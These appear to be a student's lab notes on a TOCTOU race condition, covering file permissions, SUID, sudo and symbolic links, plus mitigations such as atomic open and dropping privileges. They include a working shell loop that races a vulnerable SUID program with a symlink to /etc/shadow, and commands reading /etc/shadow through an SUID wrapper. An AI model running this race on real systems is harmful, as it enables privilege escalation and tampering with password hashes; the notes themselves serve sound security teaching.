## Learning Objective

- [x] Understand what a TOCTOU bug is and why it is prone to attacks  
- [ ] Detect race conditions caused by TOCTOU bugs  
- [ ] Provide a fix to a TOCTOU vulnerability  
- [ ] Examine file permissions and modify them using `chmod`, `chown`, `ls -l`  
- [ ] Understand the concept of privileged programs: user level vs root level  
- [ ] Compile programs and make documents with different privilege levels  
- [ ] Understand how `sudo` works and how it elevates privileges  
- [ ] Understand the difference between symbolic and hard links (`ln` vs `ln -s`)  

---
# Toctou bug

Time-of-Check to Time-of-Use is a **race condition vulnerability**. 
	When a program checks a condition (like file permissions) and then **acts on it later**, assuming the condition hasn’t changed. In between, an attacker can **swap the file** or resource, tricking the system into doing something unsafe

- This allows **regular users to escalate privileges**
- The attacker changes the resource (e.g., replacing a user file with a symbolic link to `/etc/shadow`) **between check and use**, gaining unauthorized access or control.

---
## File Permission
The reason you faced the **permission denied** error is because your username doesn’t have the correct **permission** to edit the `Root/` directory.
![[Pasted image 20250605162217.png|500]]

```bash
-rwxr-xr-x 1 root root 16840 Jun  5 16:27 root_prog_nosuid
```
 `-` : Regular file
- `rwx` : Owner (`root`) has read, write, execute
- `r-x` : Group has read and execute
- `r-x` : Others have read and execute
- No `s` → **SUID is not set**
- **Runs as the user who calls it** (no privilege escalation)

```bash
-rwsr-xr-x 1 root root 16408 ...
```
- `s` replaces the owner execute bit → **SUID is set** [[#SUID bit]]
- Meaning: When executed, this program runs with the **effective UID of the file owner**, which is **root**
- So even if a **normal user runs `rootdo`**, it runs with **root privileges**
- This is used intentionally to elevate permission for controlled tasks

```bash
-rwsr-xr-x 1 root root 16840 ...
```
- Same as `rootdo`, **SUID is set**
- Also owned by `root`
- This is the **vulnerable program** you attack in the TOCTOU lab:
    - Because of the SUID and the timing gap (access → sleep → fopen),
    - A regular user can exploit it to **modify `/etc/shadow`**

Root user is the user with the highest (administrative) privilege. It has **nothing to do with Kernel Mode**. Processes spawned while logged in as Root still runs on **User Mode**

---
## SUID bit
SUID stand for Set Owner User ID. A file with **SUID** set always **executes** as the user who **owns** the file, regardless of the user passing the command.

The **SUID** bit allows **normal** user to gain **elevated privilege** (this does **NOT** mean Kernel Mode, just privilege levels among regular users) when executing this program.
If a normal user executes this program, this program runs in root **privileges** (basically, the creator of the program)

If a normal user executes this program, this program runs in root **privileges** (basically, the creator of the program)

### Lab Question
**Can we bypass the TOCTOU attack altogether** by just using the `rootdo` wrapper to run the vulnerable program directly on `/etc/shadow`, even though we're a normal user?

`../Root/rootdo ../Root/vulnerable_root_prog /etc/shadow test-user-0

| Part                           | What it means                                                            |
| ------------------------------ | ------------------------------------------------------------------------ |
| `../Root/rootdo`               | Run the `rootdo` program (which has **SUID root** privilege)             |
| `../Root/vulnerable_root_prog` | First argument passed _to_ `rootdo`: the program `rootdo` should execute |
| `/etc/shadow`                  | Second argument to be passed to `vulnerable_root_prog` (its `argv[1]`)   |
| `test-user-0`                  | Third argument to be passed to `vulnerable_root_prog` (its `argv[2]`)    |
> No, The `vulnerable_root_prog` uses this line: `if (!access(fileName, W_OK))`
> It checks permissions **based on the calling process’s real UID and GID**, **not the effective ones.**

- Even if the program is _running with effective UID = root_, the **`access()` check still uses your original user (e.g. `ubuntu`)’s REAL UID**, which **does not** have write permission to `/etc/shadow`
- Because `access()` checks real UID (user has permission), and then (after a delay), the `fopen()` call uses **effective UID = root** (which does have permission), the attack works only in that race condition window.
---
## Attacking process 
### Reading protected file using regular user account.
``` bash
cat /etc/shadow -> cat: /etc/shadow: Permission denied
```
Met with **permission denied** because this file can only be read by `root` user, and other users in the **same group** 

```bash
test-user-1@DESKTOP-9K3T8HM: ../lab_toctou$ ./Root/rootdo cat /etc/shadow
```
The **reason** you can now successfully read the file `/etc/shadow` is because `rootdo` **has the SUID bit**. Any other program that is **executed** by `rootdo` will run with `root` (`rootdo` creator) privileges and **not** the regular user.

---
## sudo
Allows a permitted user to execute a command as the superuser or another user, as specified in the sudoers file (`/etc/sudoers`). 
This provides a mechanism for granting administrator privileges, ordinarily reserved for the root user, to normal users in a controlled manner.

---
# The Vulnerable Program

---
# The TOCTOU Bug

A class of software bug caused by a race condition involving:

- The **checking** of the state of a part of a system (such as this check in `vulnerable_root_prog` using `access`),
- And the **actual use** of the results of that check

We **exaggerate** the `DELAY` between:

1. The time of **CHECK** of the file using `access` and
2. The time of **USE** (actual usage of the file) using `fopen` by setting `sleep(DELAY)` in betweewhatn the two instructions, where `DELAY` is specified as 1 to simulate 1 second delay.

## Symbolic Link
A **symbolic** link is a special kind of file that points to another file. It contains a text string that is **automatically interpreted** and followed by the OS as a path to another file or directory.
> **A symbolic link does _not_ contain a copy of the data content of a file.**  
> Instead, it stores a **path reference** to the target file or directory. The operating system resolves this path **dynamically** whenever the symlink is accessed.


--- 
# The Attack
```sh
OLDFILE=`ls -l /etc/shadow`
NEWFILE=`ls -l /etc/shadow`

while [ "$OLDFILE" = "$NEWFILE" ]
do
    rm -f userfile.txt
    cp userfile_original.txt userfile.txt

    ../Root/vulnerable_root_prog userfile.txt test-user-0 & 
    ln -sf /etc/shadow userfile.txt & 
    NEWFILE=`ls -l /etc/shadow`
done
```

    ../Root/vulnerable_root_prog userfile.txt test-user-0 & 
    ln -sf /etc/shadow userfile.txt & 
- These two commands run **at the same time** (`&` runs them in background):

	**a.** `vulnerable_root_prog`:
	- Checks if the user has write access to `userfile.txt` (it does — at first).
	- Waits for 1 second (using `sleep(1)`)
	- Then opens it and modifies it — **but by that time, it may have changed!**

	**b.** `ln -sf /etc/shadow userfile.txt`:
	- Replaces `userfile.txt` with a **symbolic link** to `/etc/shadow`.

---
# Prevent this bug
###  1. Use Atomic Operations

**What it means:**  
Replace multi-step "check-then-use" logic with a **single atomic operation** that does both.

**Why it helps:**  
Eliminates the window of time between the “check” (e.g., `access()`) and the “use” (e.g., `fopen()`), so attackers cannot interfere in between.

**Example:**  
Instead of doing:`if (access(fileName, W_OK)) { fopen(fileName, "r+"); }`

Just do: `int fd = open(fileName, O_WRONLY);`

Let `open()` fail if permission is denied.

### 2. Avoid Unnecessary Checks

**What it means:**  
Don’t use `access()` at all if your operation (like `fopen`, `open`, etc.) already returns failure on its own.

**Why it helps:**  
Avoids introducing a vulnerable "check" phase that attackers can race.

**Safer pattern:**  
Try the action directly and handle any errors:
`FILE *fp = fopen(fileName, "r+"); if (!fp) { perror("fopen failed"); }`

### 3. Use File Locking

**What it means:**  
Lock the file during access using OS-level locking (e.g., `flock()`).

**Why it helps:**  
Prevents other processes from modifying or replacing the file while your process is using it.

**Limitations:**  
Not all filesystems support file locking well; implementation can get complex and error-prone.

### 4. Privilege Management — Drop Privileges Early

**What it means:**  
Temporarily drop elevated privileges to match the real user ID after checks, before doing sensitive operations.

**Example from lab:** `seteuid(getuid());  // Drop to real user privileges`

**Why it helps:**  
Prevents the SUID program from unintentionally writing to files the user normally shouldn't access.

### 5. Disable the SUID Bit

**What it means:**  
Use `chmod u-s vulnerable_root_prog` to disable SUID.

**Why it helps:**  
Without SUID, the program can’t run with elevated (root) privileges — so even if vulnerable, it can’t do harm.

**Caveat:**  
Disabling SUID may break functionality if the program _needs_ elevated permissions for legitimate reasons.
